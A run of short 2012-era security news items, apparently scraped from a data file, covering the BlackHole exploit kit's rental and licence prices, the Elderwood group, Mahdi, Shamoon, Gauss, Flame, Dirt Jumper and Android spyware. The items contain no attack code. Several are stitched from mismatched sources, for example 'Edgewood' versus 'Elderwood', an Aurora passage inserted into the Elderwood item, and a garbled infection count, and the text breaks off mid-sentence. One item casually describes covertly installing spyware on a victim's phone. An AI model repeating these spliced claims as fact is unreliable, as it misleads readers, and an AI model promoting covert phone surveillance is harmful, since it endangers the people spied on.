BlackHole is one of the most dominant exploit toolkits currently available in the underground market. It enables attackers to exploit security holes in order to install malicious software on victim's systems. The new variant doesn’t rely on plugindetect to determine the Java version that’s installed, thus speeding up the malware download process. Old exploits that were causing browsers to crash and “scary visual effects” have been removed. The exploit kit is offered both as a \"licensed\" software product for the intrepid malware server operator and as malware-as-a-service by the author off his own server. Some interesting claims by developer about new version:prevent direct download of executable payloads only load exploit contents when client is considered vulnerable drop use of PluginDetect library (performance justification) remove some old exploits (leaving Java atomic & byte, PDF LibTIFF, MDAC) change from predictable url structure (filenames and querystring parameter names) update machine stats to include Windows 8 and mobile devices better breakdown of plug-in version information improved checking of referrer block TOR traffic Finally, a number of “private tricks” have been implemented, which the author prefers to keep a secret because he fears that competitors and antivirus companies are “sneaking around.” The developer offers a one-day rental of capacity on his server for as little as $50, up to a month-long lease for $500 (with larger fees for traffic over 70,000 web hits per day). For those who want to run their own BlackHole server, licenses start at $700 for a 3-month license (which includes software support) and range up to $1,500 for a full year, plus $200 for the multidomain version. For those who want to cover their tracks, a site clean-up package comes priced at $300." }

Security researchers with Symantec have issued a report outlining the techniques used by the so-called \"Edgewood\" hacking platform and the group behind it. The group seemingly has an unlimited supply of zero-day vulnerabilities. The company said that the group is well-funded and armed with more than a half-dozen unpublished security vulnerabilities. \"They are definitely shifting their methodology, and there are open questions about why that is,\" said Eric Chien, senior technical director for Symantec's security response group. \"They may be finding that older techniques are no longer working.\" \"The number of zero-day exploits used indicates access to a high level of technical capability.\"The researchers said that the group appears to favour \"watering hole\" attacks techniques in which the attacker profiles a targeted group and places attack code into sites which the targets are likely to visit. Here are just some of the most recent exploits that they have used: • Adobe Flash Player Object Type Confusion Remote Code Execution Vulnerability (CVE-2012-0779) • Microsoft Internet Explorer Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875) • Microsoft XML Core Services Remote Code Execution Vulnerability (CVE-2012-1889) • Adobe Flash Player Remote Code Execution Vulnerability (CVE-2012-1535) Operation Aurora was a cyber attack which began in mid-2009 and continued through December 2009. The attack was first publicly disclosed by Google on January 12, 2010. In the blog post, Google said the attack originated in China. The attacks were both sophisticated and well resourced and consistent with an advanced persistent threat attack.The attack has been aimed at dozens of other organizations, of which Adobe Systems, Juniper Networks and Rackspace have publicly confirmed that they were targeted. The security firm has published details in a 14-page research report titled “The Elderwood Project”. The first thing that stands out in the report is that the vast majority of detections are in the US. In the last year, Symantec detected 677 files used by the Elderwood gang in the US.

VirusTotal, company based in Spain with only a handful of employees, performs the free service by pooling data from scores of “antivirus engines, website scanners, file and URL analysis tools,” according to its site. Users only have to head to the online tool, select the file from their desktops, and the system is supposed to take care of the rest. The maximum file size currently supported by the service is 32MB. In a blog post on Friday, VirusTotal reps asserted that the merger is good news for consumers and bad news for malware generators for the following two reasons: The quality and power of our malware research tools will keep improving, most likely faster; and Google’s infrastructure will ensure that our tools are always ready, right when you need them. “Our goal is simple: to help keep you safe on the web,” VirusTotal said in the post today. “And we’ve worked hard to ensure that the services we offer continually improve. But as a small, resource-constrained company, that can sometimes be challenging. So we’re delighted that Google, a long-time partner, has acquired VirusTotal.” VirusTotal was set up in 2007 and uses over 40 different antivirus engines to scan files and URLs for malware for free. Users can upload small files for checking, or just input a URL, to see if it's on a blacklist, and VirusTotal shares its results with other security vendors to allow them to beef up their defenses. VirusTotal will continue to operate independently and maintain existing partnerships with other antivirus companies and security experts. Neither Google nor VirusTotal have revealed any further plans about how this might affect Google services, but it is possible that VirusTotal's solutions could be integrated throughout Google Apps to protect users against malicious files shared through Gmail and other programs." }

Despite the recent uncovering of the 'Madhi' malware that has infected several hundred computers in the Middle East, researchers say the virus is continuing to spread. The malware, known as 'Mahdi' or 'Madi', was originally discovered by Seculert. In addition to stealing data from infected Windows computers, it is also capable of monitoring email and instant messages, recording audio, capturing keystrokes and taking screenshots of victims' computers. Working together, researchers at Seculert and Kaspersky sinkholed the malware's command and control servers and monitored the campaign. What they found was a targeted attack that impacted more than 800 victims in Iran, Israel and other countries from around the globe. Israeli security company Seculert said it had identified about 150 new victims over the past six weeks as developers of the Mahdi virus had changed the code to evade detection by anti-virus programs. That has brought the total number of infections found so far to nearly 1,000, the bulk of them in Iran. \"These guys continue to work,\" Seculert Chief Technology Officer Aviv Raff said via telephone from the company's headquarters in Israel. \"This tells us that the attackers are still doing a very effective job with this surveillance malware,\" he said. The majority of the victims were in Iran, and many were found to be businesspeople working on Iranian and Israeli critical-infrastructure projects, Israeli financial institutions, Middle East engineering students or various government agencies in the region. All totaled, multiple gigabytes of data are believed to have been uploaded from victims' computers, researchers have said. Seculert and Kaspersky dubbed the campaign Mahdi after a term referring to the prophesied redeemer of Islam because evidence suggests the attackers used a folder with that name as they developed the software to run the project. They also included a text file named mahdi.txt in the malicious software that infected target computers." }

Security researchers from Kaspersky Lab have uncovered information suggesting a possible link between the mysterious malware that attacked Iranian oil ministry computers in April and the Stuxnet and Duqu cyber espionage threats. The malware wipes data from hard drives, placing high priority on those with a .pnf extension, which are the type of files Stuxnet and Duqu used, and has other behavioral similarities, according to Schouwenberg. It also deletes all traces of itself. As a result, researchers have not been able to get a sample, but they've reviewed mirror images left on hard drives. Kaspersky's researchers were not able to find the mysterious malware, which was given the name Wiper, because very little data from the affected hard disk drives was recoverable. Even though a connection to Flame is unlikely, there is some evidence suggesting that Wiper might be related to Stuxnet or Duqu.For example, on a few of the hard drives analyzed, the researchers found traces of a service called RAHDAUD64 that loaded files named ~DFXX.tmp where XX are two random digits from the C:\\WINDOWS\\TEMP folder. No one has ever found a sample of Wiper in order to study its code and determine exactly what it did to machines in Iran. According to Kaspersky, the malware’s algorithm is “designed to quickly destroy as many files as effectively as possible, which can include multiple gigabytes at a time.” Although Flame can be updated by its creators with various modules, including conceivably a module that would destroy data, there has never been any evidence found that Flame had a module that was used to destroy data on machines or wipe out hard drives." }

Atif Mushtaq wrote on the company's blog that he spotted the initial exploit on a domain that pointed to an IP address in China. The vulnerability allows computers to be infected by simply visiting a specially crafted web page, and the malware served in the current attacks contacts a C&C server in Singapore. Researchers from heise Security have also created a PoC page using information that is publicly available. A separate post published on Monday by researchers Andre M. DiMino and Mila Parkour said the number of attacks, which appear to install the Poison Ivy Remote Access Trojan, were low. But they went on to note that the typical delay in issuing Java patches, combined with the circulation of exploit code, meant it was only a matter of time until the vulnerability is exploited more widely by other attackers. Developers at vulnerability management company Rapid7, which owns the Metasploit Project, on Sunday added the exploit to their penetration testing framework. And the exploit is expected to show up if it hasn't already in the widely used BlackHole exploit toolkit, one of the most popular threats on the web. \"This vulnerability is not a 'memory corruption' type vulnerability, but instead seems to be a security bypass issue that allows running untrusted code outside the sandbox without user interaction,\" Eiram said. \"In this specific case a file is downloaded and executed on the user's system when just visiting a web page hosting a malicious applet.\" It's not clear when Oracle will release a patch for this vulnerability. The company did not immediately respond to a request for comment. Some security experts are prepping an unofficial patch for the program that should blunt this vulnerability. However, uninstalling or disabling Java is probably not an acceptable solution for a large number of companies and users that rely on Java-based Web applications to conduct their daily business." }

Immediately after the Aug. 15 attack, the company announced it had cut off its electronic systems from outside access to prevent further attacks. Saudi Aramco said the virus \"originated from external sources\" and that its investigation into the matter was ongoing. There was no mention of whether this was related to this month's Shamoon attacks. “The disruption was suspected to be the result of a virus that had infected personal workstations without affecting the primary components of the network,” Saudi Aramco said over Facebook. “We would like to emphasize and assure our stakeholders, customers and partners that our core businesses of oil and gas exploration, production and distribution from the wellhead to the distribution network were unaffected and are functioning as reliably as ever,” Saudi Aramco’s chief executive, Khalid al-Falih, said in a statement. However, one of Saudi Aramco’s websites which was taken offline after the attack - www.aramco.com - remained down yesterday. E-mails sent by Reuters to people within the company continued to bounce back. Supposed hacktivists have claimed the hit on the oil giant, saying they would hit the company again tomorrow. The group said it was “fed up of crimes and atrocities taking place in various countries around the world”, in a post on Pastebin. They said they were targeting the House of Saud, the ruling royal family of Saudi Arabia, and targeted Aramco as it was “the largest financial source for Al-Saud regime”. The group, calling itself the ‘Cutting Sword of Justice’, claimed to have hacked Aramco systems in several countries before sending a virus across 30,000 computers achieving a 75 percent infection rate of all the company’s systems. It refuted suggestions that a nation state was behind the attack. Symantec, one of the world’s largest internet security companies, said on the day after the Saudi Aramco attack that it had discovered a new virus that was targeting at least one organisation in the global energy sector, although it did not name that organisation. “It is a destructive malware that corrupts files on a compromised computer and overwrites the MBR (Master Boot Record) in an effort to render a computer unusable,” Symantec said in a blog posting about the virus, which it called W32.Disttrack. “Threats with such destructive payloads are unusual and are not typical of targeted attacks.” Saudi Aramco’s al-Falih said in his statement yesterday: “Saudi Aramco is not the only company that became a target for such attempts, and this was not the first nor will it be the last illegal attempt to intrude into our systems, and we will ensure that we will further reinforce our systems with all available means to protect against a recurrence of this type of cyber attack.”" }

According to experts from security firm Symantec, it all starts with the unknown dropper which installs a DLL backdoor onto the compromised device. This backdoor then installs the driver component that allows the attacker to communicate with the infected computer. Unlike many other pieces of malware, Hikit doesn’t attempt to contact its command and control server once it infects a device. Instead, the kernel is designed to wait for the attacker to initiate communications, significantly reducing the threat’s operational capabilities.Backdoor.Hikit is compromised of four components: Unknown dropper that compromises a system and installs a malicious dynamic-link library (DLL) file DLL that implements back door functionality and installs a kernel driver Kernel driver that monitors network traffic for connections from an attacker Client tool that attackers use to connect to the back door It is greatly possible that your online saved accounts and passwords, personal and financial information will be exposed and transfer to remote hackers, which will lead to identified thief.

But what if there was a virus compiled from little bits of programs you already had installed? That's just what two security researchers are looking into. Frankenstein or The Modern Prometheus is a classic story in which a doctor creates life through technology in the form of a creature assembled from the parts of dead men. While this biological idea exists only in fiction, researchers have recently used it to craft a very ingenious piece of malware. Vishwath Mohan and Kevin Hamlen at the University of Texas at Dallas are interested in how malware disguises itself in order to propagate more widely. In Windows Explorer alone, Frankenstein found nearly 90,000 gadgets in just over 40 seconds, which means that malware created by the system would have a huge number of possible variations, work quickly, and be very difficult to detect. Frankenstein follows pre-written blueprints that specify certain tasks - such as copying pieces of data - and swaps in gadgets capable of performing those tasks. Such swaps repeat each time Frankenstein infects a new computer, but with different gadgets, meaning that the malware always looks different to antivirus software, even if its ultimate effects are the same. Malware authors and security experts have tried different ways to camouflage malicious code, like encrypting it or adding garbage data to confuse the scanners. As they remark in the paper describing their work \"The results show that even with the limited capacity of our prototype, 2–3 binaries are sufﬁcient to bring the number of gadgets above 100,000. On average we discovered about 46 gadgets per KB of code, ﬁnding approximately 2338 gadgets per second.\" The research was presented at the USENIX Workshop on Offensive Technologies earlier this month and highlights the need for a new approach for virus detection software, one that is able to find malware that morphs and is disguised in the trappings of legitimate code. The US Air Force partially funded the project, the findings of which may be used to influence future state-sponsored cyber attacks." }

With Android being the most popular platform for smartphones and tablets around the world, Android users have become the low-hanging fruit when it comes to writing malware by the nefarious users. A new Android threat has affected 500,000 devices in China so far. Analysts at TrustGo Security Labs have discovered the Trojan!SMSZombie.A. It is a complex and sophisticated malware that exploits a vulnerability in the China Mobile SMS Payment System to fund unauthorised payments, steal bank card numbers and receipt information regarding money transfers. The trojan is difficult to detect, and even more difficult to remove. SMSZombieA was first discovered on August 8, and the malware is embedded in several wallpaper apps. The wallpaper apps are noted to use provocative titles and nude images to encourage users to download. The trojan installs itself on a device after its user has downloaded and installed the app, making detection difficult. As a result, the wallpaper app is not flagged as malicious in the marketplace. Further, the trojan can change the amount and timing of unauthorised charges; that way most times users don't know that they have been hacked. According to the information TrustGo Vice President of Engineering , the Trojan does not report back to a C&C server. In fact, the malware receives its orders from an ever-changing set of random phone numbers. The malware can remotely control the infected device. It enables hackers to remotely control victims' mobile SMS payments system, allowing them to secretly authorize payments for amount and at any time. “Our guess is that these malware developers have some connection with these premium services,”. Researchers have found that by using a configuration file, which can be updated by the makers of the malware at any time, it is possible for the malware to intercept and forward text messages.

W32.Disttrack is a new threat that is being used in specific targeted attacks against at least one organization in the energy sector. It is a destructive malware that corrupts files on a compromised computer and overwrites the MBR (Master Boot Record) in an effort to render a computer unusable. W32.Disttrack consists of several components:Dropper—the main component and source of the original infection. It drops a number of other modules. Wiper—this module is responsible for the destructive functionality of the threat. Reporter—this module is responsible for reporting infection information back to the attacker. \"Ten years ago we used to see purely malicious threats like this,\" muses Symantec researcher Liam O Murchu. The likely scenario for the victim would be an experience in which the computer is booting up, but all the files get erased, and the computer collapses into a non-bootable state. Saudi Arabia-based Saudi Aramco, the world’s largest crude exporter, was reportedly hit by a computer virus this week that entered its network through personal computers. Shamoon is unusual because it goes to great lengths to ensure destroyed data can never be recovered, something that is rarely seen in targeted attacks.

The command and control (C&C) servers of the Dirt Jumper DDoS toolkit can be compromised and, in principle, completely taken over via SQL injection holes. SQL injection involves inserting database instructions in unexpected and unprotected places, effectively taking charge of a web application's database from the outside. According to the Prolexic report, the open source penetration testing tool sqlmap can be used to dump the contents of Dirt Jumper's database configuration file in a matter of seconds, revealing administrative usernames and passwords. The company's research includes Dirt Jumper v.3, Pandora and Di BoT. According to Prolexic, the Dirt Jumper family of DDoS botnet kits was originally authored by an individual who uses the handle ‘sokol.’ Various versions of Dirt Jumper were sold privately and leaked to the public. \"DDoS attackers take pride in finding and exploiting weaknesses in the architecture and code of their targets. With this vulnerability report, we've turned the tables and exposed crucial weaknesses in their own tools,\" said Prolexic's CEO, Scott Hammack. Pandora can be used to launch five different attack types, including a combination of techniques against the web application and infrastructure layers of targeted websites. Dirt Jumper seems to have overtaken rivals to become one of the most successful DDoS toolkits available on the Russian underground. \"Construction of a new variant of Dirt Jumper is relatively easy, only requiring basic knowledge of Delphi, a basic understanding of PHP and MySQL, and U.S. $5,000 to purchase the Dirt Jumper builder source code\"." }

After Stuxnet, Duqu, and Flame, this one seems to mainly spy on computer users in Lebanon. It’s been dubbed Gauss (although Germanic-linguistic purists will no doubt be complaining that it should be written Gauß). Gauss is a complex cyber-espionage toolkit, highly modular and supports new functions which can be deployed remotely by the operators in the form of plugins. The currently known plugins perform the following functions: Intercept browser cookies and passwords. Harvest and send system configuration data to attackers. Infect USB sticks with a data stealing module. List the content of the system drives and folders Steal credentials for various banking systems in the Middle East. Hijack account information for social network, email and IM accounts. The researchers at Russia-based Kasperky Labs who discovered it have christened it Gauss, and say it is aimed at pinching the pocketbooks of its intended targets, whoever they may be, by stealing account information of customers of certain banks in Lebanon, but also customers of Citibank and of PayPal. An analysis of the new malicious software shows it was designed to steal data from Lebanese lenders including the Bank of Beirut (BOB), BomBank and Byblos Bank, Kaspersky said. Gauss has infected 2,500 machines, while Flame hit about 700. Two groups Russian-based Kaspersky Labs, which first published information on Gauss and Flame, and the Hungarian research lab Crysys are detecting the malware by looking for a font that shows up on infected machines called Palida Narrow.Roel Schouwenberg, senior researcher at Kaspersky Labs, said that researchers still don’t know why Gauss’s creators included the font file.

At its height, the Mariposa botnet infected up to 12.7 million PCs, with more than half of the Fortune 1,000 companies believed to have been compromised, including 40 major banks. Once a computer had been compromised and brought into the botnet, operators could steal information from innocent users - including credit card details and banking passwords. Computer crime-fighting authorities had succeeded in bringing down the Mariposa botnet at the end of 2009, FBI officials worked with Spanish and Slovenian authorities to track down Mariposa's mastermind, Iserdo. He was said to charge between $500 for basic versions of the botnet code and up to $1,300 for more advanced ones, which included customised features, such as capabilities which allowed its operators to to steal credit cards and online banking credentials. The code was even found to have infected 3,000 HTC handsets shipped by mobile operator Vodafone. Mariposa style botnets were built using Škorjanc's \"Butterfly Bot\" code, according to the Slovenian authorities, and it was sold to cyber criminals worldwide. Mariposa, the Spanish version of the botnet, was the largest and the most notorious." }

Currently, the whole world has its eyes glued to TV screens watching the London 2012 Olympic Games. Anti-malware and anti-virus solutions provider Webroot has issued a warning that an app app called \"London Olympics Widget,\" which is described as an app that displays aggregated Olympic news coverage. In fact, it's really just harvesting the user's contact list and device ID while reading up on SMS messages too. The package name is ‘com.games.London.Olympics.widget’. This app has a digital certificate claiming it was developed in New Delhi, India. For this scam, cybercriminals create websites that are very appealing; some even look very professional that they make it seem that you are close to having access to live programming. Researchers explain that the crooks rely on black hat SEO techniques to make sure that their malicious websites show up among the first in search engine results. The security firm has determined that close to 10,000 clicks have already been redirected to the fraudulent Olympics website.Overall, a number of 38,000 clicks have been redirected to such sites, the victims being spread out across 100 countries. Webroot advises that consumers should take a close look at the author of the app and then search the name to see if it is in fact a reputable company and/or developer, as seen in the photo above. A way that consumers can protect themselves from becoming a victim of these types of online scams is by learning about social engineering so they can recognize it and avoid falling into these traps.

Huawei is working with British spooks to prove that it has no backdoors in its products which would allow Chinese agents to snuffle Her Majesty's secrets. The U.S. and Australia have made clear their distrust of one of the world’s biggest telecoms company. The Australian government, for instance, banned the company from participating in bids for its national broadband network due to potential spying threats. Huawei, which has grown to become one of today’s dominant telecommunications equipment companies, is likewise constantly under threat because of what some might call China-bashing. Over the past ten years or so, Chinese telecoms firms such as Huawei and ZTE, another telecoms-equipment provider, have expanded from their vast home market to become global players. Huawei is becoming an increasingly powerful global player, capable of going head-to-head with the best in intensely competitive markets. Several big Chinese firms, including ZTE and China Mobile, a giant mobile operator, have attracted scrutiny. But thanks to its size and its international reach it is Huawei that gets most attention. But according to the Economist, the centre is being used to persuade Q that equipment from the manufacturer that runs it can be trusted. GCHQ has a handy base near by. Apparenly anyone who is anyone is riding a cock horse to Banbury cross to see a Chinese company with a Western gloss.What is interesting is that Huawei staff have UK security clearances and some of them used to work for GCHQ, so the relationship in Blighty is very close. Even Huawei suggests a proactive approach to security. “Believe no one and check everything,” says John Suffolk, former CIO of the British government and now Huawei’s global cyber-security officer. However, experts say that security flaws are difficult to find, and can sometimes be subtly embedded in the code, and possibly included by accident. As such, doubts remain." }

Your Smartphone is an always-on and always-connected digital extension of your life which will be used by attackers to covertly steal your sensitive data and spy on you. Mahesh, An Independent Security Researcher and Android Developer/Hacker will demonstrate \"Android Spy Agent\". This application allows us to remotely access the entire victim’s personal information and even though the confidential data available in the android cell phone. The type of personal information includes the victim’s contacts, call logs, messages, browser’s history, GPS location and much more information directly available on the victim’s cell phone. Many-a-times we think that is there any way by which we can read the private sms of anyone. So here is the solution Mr. Mahesh will present in The Hackers Conference 2012 platform with Hundreds of advance features. This application can also allow the attacker to remotely delete the data available on the victim’s phone. In order to perfectly work this application you have to gain access to the victim’s android cell phone for at least 20 seconds. You have to install the application and then restart the cell phone. After restart your application gets automatically started on the victim’s cell phone. Now you can access the victim’s cells information for any normal cell phone and get the response on it. The android spy agent will be hidden in the victim’s cell phone and not allows the victim to easily uninstall or delete it from the cell. In Another Talk Android Hacker Aditya Gupta and Subho Halder will talk about \"All your Droids belong to me : A look into Mobile Security in 2012\". Researchers have developed and will Demonstrate malware for Android phones that can be used as a spam botnet. \"The talk is about Android Malwares, Botnets and all the crazy stuff you have been hearing in the past. We will give an inside view on how the black hat underground uses this, to earn 5-6 digit income per month . For this, We will start off by creating an Android Malware, and then will gradually move on to the Botnet Part.\", Aditya Gupta said. Maintaining that a wide variety of services are being offered on the mobile platforms without proper security implementation, Anurag Kumar Jain and Devendra Shanbhag from Tata Consultancy Services will deliberate on the topic, \"Mobile Application Security Risk and Remediation\". They will highlight the need for application security in mobile applications, the threats in a mobile environment, key security issues that can creep in mobile applications, and suggests a secure development approach which can possibly safeguard mobile applications from becoming “sitting ducks” for attackers and mobile malware. Experts from countries like Iran and Argentina will share space with Indian speakers in the day-long discussion at the India Habitat Centre.

These logins have not been compromised from the Microsoft server, but are instead based on login information leaked from other sites. \"These attacks shine a spotlight on the core issue people reuse passwords between different websites,\" he said. Microsoft regularly gets lists of compromised third-party login details from ISPs, law enforcement and vendors, as well as from lists published on the internet by hackers, according to Doerr. This information is checked against Microsoft login details using an automated process to check for any overlap. While 20 percent is the average, in one recent breach it was only 4.5 percent, said Doerr. Like Just last week, both Yahoo! Voices and the Android forums at website Phandroid were hacked, resulting in the leakage of almost 1.5 million usernames and passwords. When a list of usernames and passwords are leaked, it seems that Microsoft have been running these against its database looking for matches. The results are quite shocking.

It's designed to protect end users against hack attacks that install malware on handsets. Android 4.1 Jelly Bean includes several new exploit mitigations and a more extensive implementation of ASLR to help defeat many kinds of exploits. ASLR is an exploit mitigation method that randomizes the positions of key data areas such as libraries, heap, stack, and the base of the executable, in a process's address space, and that makes it near impossible for malware authors and hackers to predict where their malicious payloads will be loaded. \"As we mentioned in our previous post on Android ASLR, the executable mapping in the process address space was not randomized in Ice Cream Sandwich, making ROP-style attacks possible using the whole executable as a source of gadgets. In Jelly Bean, most binaries are now compiled/linked with the PIE flag, which means they will be properly randomized when executed,\" Jon Oberheide of Duo Security. That will make it significantly harder to use a technique known as return-oriented programming when exploiting buffer overflows and other memory-corruption vulnerabilities discovered in the mobile platform.

Thousands of Canadians could be among the hundreds of thousands of people around the world who might lose Internet access on July 9.That's the day the FBI will shut down all the \"clean servers\" it set up to combat a massive hacking operation. Last November the FBI arrested and charged six Estonian men behind the malware as part of Operation Ghost Click. These hackers were able to make a fortune off their project, raking in millions for ads placed on their fraudulent websites.On the eve of the arrests, the FBI hired Paul Vixie, chairman of the Internet Systems Consortium (ISC) to install two temporary Internet servers that would prevent infected users from losing access to the Internet once the DNSChanger botnet was shut down. DNS (Domain Name System) is a core Internet technology used to convert human readable domain names suchasfacebook.com into an IP address such as 10.181.211.1, which a computer understands. It's estimated that there is still around 277,00 infections worldwide, despite a massive clean up operation. If you're concerned about your own PC, or family members, then there's a DNS checker website or more information over at the DNS Changer Working Group. Running the temporary servers for eight months has cost the FBI $87,000. Both Facebook and Google created their own warning messages that showed up if someone using either site appeared to have an infected computer. Facebook users would get a message that says, \"Your computer or network might be infected,\" along with a link that users can click for more information.Google users got a similar message, displayed at the top of a Google search results page. It also provides information on correcting the problem.

Researchers at NC State in the US have developed a proof-of-concept prototype rootkit that attacks the Android framework and could be used to steal personal information. What is clickjacking? It is a malicious technique that tricks users and is often used to take over computers, web cams, or snag confidential info that is revealed by users who thinks they are on an innocent webpage. Like most Android malware, the rootkit can be distributed as a malicious app, opening up a host of potential vulnerabilities on any device on which it is installed. However, it functions in a different way. The rootkit, which could be bundled with an app and is said to be undetectable by anti-virus packages, would allow an attacker to replace a smartphone's browser with a version that logs key strokes to capture bank card data and uploads them to a hacker-controlled website. Jiang explained in a video in which he demonstrates the rootkit in action:In a demonstration video, the rootkit is shown manipulating the apps on a smartphone. Such a program could be used by cybercriminals to replace an app with a malicious data stealing version that appears legitimate to the user. “This would be a more sophisticated type of attack than we’ve seen before,” says Jiang, “But there is good news. Now that we’ve identified the problem, we can begin working on ways to protect against attacks like these.”" }

Once discovered the email accounts used to transfer the stolen data the group of researcher noticed that the InBox for each of them was full, they turned out all saturated by over 100,000 mails giving an idea of the dimension of the attack. The virus has been detected several months ago but only in the last weeks it has been observed an explosion of the number of infected systems. The researcher Righard Zwienenberg researcher of ESET declared “It represents a serious case of industrial espionage,” “Every new design is sent automatically to the operator of this malware. Needless to say this can cost the legitimate owner of the intellectual property a lot of money as the cybercriminals have access to the designs even before they go into production.” “They may even have the guts to apply for patents on the product before the inventor has registered it at the patent office.” The malware not limits its action to steal Autocad projects, it also checks the presence of Outlook email client to steal the pst file containing contacts, calendar and emails, confirming its genesis of espionage tool. For completeness of information ESET provided a free stand-alone cleaner available for the ACAD/Medre.A worm. Every time we speak about of cyber espionage we could not think other that China, however the practice is really diffused and the fact that the accounts are related to Chinese accounts is clue but not a certainty. It’s clear that Chinese hackers are considered worldwide specialist in cyber espionage, the case of Nortel is considered a case study for the impact of cyber espionage on the business of private companies. The Chinese government, and not only, at least a decade sponsored espionage activities for stealing trade secrets, confidential information and intellectual property of various kinds. Many experts are convinced that thanks to their ability to spy they were able, through the theft and reverse engineering of products, to clear the technological gap with the western industry. This time the Chinese authorities have demonstrated a collaborative approach identifying and blocking the accounts used for theft. Tens of thousands of AutoCAD blueprints leaked, the team of ESET experts promptly contacted the Chinese authorities such us Tencent company, owners of the qq.com domain, and also the Chinese National Computer Virus Emergency Response Center, their collaboration was essential to access to the account blocking them. Another lesson learnt is an efficient fight to the cybercrime must be conducted with a total collaboration of all the involved actors. Only in this way it’s possible to conduct an efficient immunization.Written By: Pierluigi PaganiniReferences[Source]" }

Chris Valasek, a senior security research scientist at development testing firm Coverity, began examining the security features of Windows 8 last autumn, before the consumer previews of the upcoming revamp of the new Microsoft OS came out. \"There are always going to be vulnerabilities but you can make it difficult to leverage vulnerabilities to write exploits.\" One major change between Windows 7 and 8 is the addition of more exploit-mitigation technologies, however. Windows Memory Managers (specifically the Windows Heap Manager and Windows Kernel Pool Allocator) are designed to make it far harder for attackers to exploit buffer-overflow vulnerabilities and the like to push malware onto vulnerable systems. The \"security sandbox\" for applications for Windows 8 will also be a great step forward. \"These new Windows 8 Apps will be contained by a much more restrictive security sandbox, which is a mechanism to prevent programs from performing certain actions,\" Valasek explains. \"This new App Container provides the operating system with a way to make more fine-grained decisions on what actions certain applications can perform, instead of relying on the more broad ‘Integrity Levels’ that debuted in Windows Vista/7. Windows 8 also comes with a new version of Internet Explorer, Microsoft's browser software. Internet Explorer 10 will come with a mode that disables support for third-party plug-ins such as Flash and Java." }

The Milicenso Trojan is actually a backdoor that is used to deliver other malware on the affected machines. The infection vectors are links and malicious attachments in unsolicited emails, as well as websites hosting malicious scripts that trigger the download of the Trojan. “Depending on the configuration, any files, including binary files, created in that folder will trigger print jobs,” said Symantec. \"The Trojan creates and executes a dropper executable, which in turn creates a DLL file in the %System% folder\" It’s like dragging a system file into a plain-text editor: most of the time you’ll see garbage. Symantec said there were a number of ways the malware can find its way onto PCs, including opening a malware-laden email attachment, through a compromised website, or posing as fake video codecs.Once the malware is opened, it redirects the user to pages to serve up adverts; a common way for malware writers to generate quick revenue." }

The United States and Israel jointly developed the Flame computer virus that collected intelligence to help slow Iran's nuclear program. The massive piece of malware secretly mapped and monitored Iran’s computer networks, sending back a steady stream of intelligence to prepare for a cyber­warfare campaign, according to the officials. The effort, involving the National Security Agency, the CIA and Israel’s military, has included the use of destructive software such as the Stuxnet virus to cause malfunctions in Iran’s nuclear-enrichment equipment. The cyber campaign against Iran's nuclear program has included the use of another computer virus called Stuxnet that caused malfunctions in Iran's nuclear enrichment equipment. “This is about preparing the battlefield for another type of covert action,” said one former high-ranking U.S. intelligence official, who added that Flame and Stuxnet were elements of a broader assault that continues today. “Cyber-collection against the Iranian program is way further down the road than this.” Flame was discovered back in May, following an investigation into a series of mysterious data loss incidents at Iran's Oil Ministry. Those attacks were carried out in April by the Israeli part of the operation without knowledge from the U.S. side. Security researchers from Kaspersky Lab believe that Flame was created in the first half of 2008. Stuxnet was discovered in June 2010, but the first variant of the malware is believed to date from June 2009. Spokesmen for the CIA, the NSA and the Office of the Director of National Intelligence, as well as the Israeli Embassy in Washington, declined to comment." }

U.S. computer security researchers said on Sunday that the Flame computer virus, which struck at least 600 specific computer systems in Iran, Syria, Lebanon, Egypt, Sudan, Saudi Arabia and the Palestinian Authority, has gotten orders to vanish, leaving no trace. The 20-megabyte piece of malware already had a self-destruct module known as SUICIDE that removed all files and folders associated with Flame, but the purging command observed by Symantec researchers instead relied on a file called browse23.ocx that did much the same thing. According to Symantec, the ‘suicide' command was “designed to completely remove Flame from the compromised computer,” the BBC reports. Computers infected with Flame, including honeypots, have been routinely contacting its C&C servers to check for new commands. When the C&C servers still owned by Flame’s authors recently sent out a self-destruct code, Symantec detected the command immediately. Flame was designed to suck information from computer networks and relay what it learned back to those controlling the virus. It can record keystrokes, capture screen images, and eavesdrop using microphones built into computers. Bots have long contained such self-destruct mechanisms, so it's not surprising that malware as complex and comprehensive as Flame would, too." }

Bouncer, which checks for malicious apps and known malware, is a good first step, but as new work from researchers Jon Oberheide and Charlie Miller shows, it can be bypassed quite easily and in ways that will be difficult for Google to address in the long term. Bouncer is an automated process that scans apps for known malware, spyware, and Trojans, and looks for suspicious behaviors and compares them against previously analyzed apps. If malicious code or behavior is detected, the app is flagged for manual confirmation that it is malware. “This screencast shows our submitted app handing us a connect-back shell on the Bouncer infrastructure so that we can explore and fingerprint its environment,” Oberheide wrote in a blog post this morning.“While Bouncer may be unable to catch sophisticated malware from knowledgeable adversaries currently, we’re confident that Google will continue to improve and evolve its capabilities.

The patch revoked three intermediate Microsoft certificates used in active attacks to “spoof content, perform phishing attacks, or perform man-in-the-middle attacks”.Microsoft also killed off certificates that were usable for code signing via Microsoft’s Terminal Services licensing certification authority (CA) that ultimately “chained up” to the Microsoft Root Authority.The authority issued certificates for users to authorise Remote Desktop services in their enterprises. The Microsoft blog post explains that a vulnerability in an old cryptography algorithm is exploited by some elements of Flame to make them appear as if they originated from Microsoft. Most systems around the world accept officially-signed Microsoft code as safe by default, so the malware would enter unnoticed. Windows users are urged to install the new KB2718704 patch.

The Flame computer virus not only stole large quantities of information from various Iranian government agencies, but apparently even disrupted its oil exports by shutting down oil terminals, information security firm Symantec Israel said yesterday. The Flame virus recently found in Iran could be used to infect other countries, according to the International Telecommunications Union. As the United Nations agency charged with helping members protect their data networks, the ITU plans to issue a warning about the danger of Flame. Iran's National Computer Emergency Response Team (Maher) said in a statement that the detection and clean-up tool was finished in early May and is now ready for distribution to organisations at risk of infection.Flame was discovered after the UN's International Telecommunications Union asked for help from security firms to find out what was wiping data from machines across the Middle East.An investigation uncovered the sophisticated malicious programme which, until then, had largely evaded detection. The virus is about 20 times the size of Stuxnet, malware that targeted the controls of an Iranian nuclear facility. The largest concentration of infected machines is in Iran, followed by the Palestinian-controlled West Bank, Sudan, Syria, Lebanon, Saudi Arabia, and Egypt. According to the crysys report on sKyWIper (aka Flame):sKyWIper has very advanced functionality to steal information and to propagate. Multiple exploits and propagation methods can be freely configured by the attackers. Information gathering from a large network of infected computers was never crafted as carefully as in sKyWIper. The malware is most likely capable to use all of the computers’ functionalities for its goals. It covers all major possibilities to gather intelligence, including keyboard, screen, 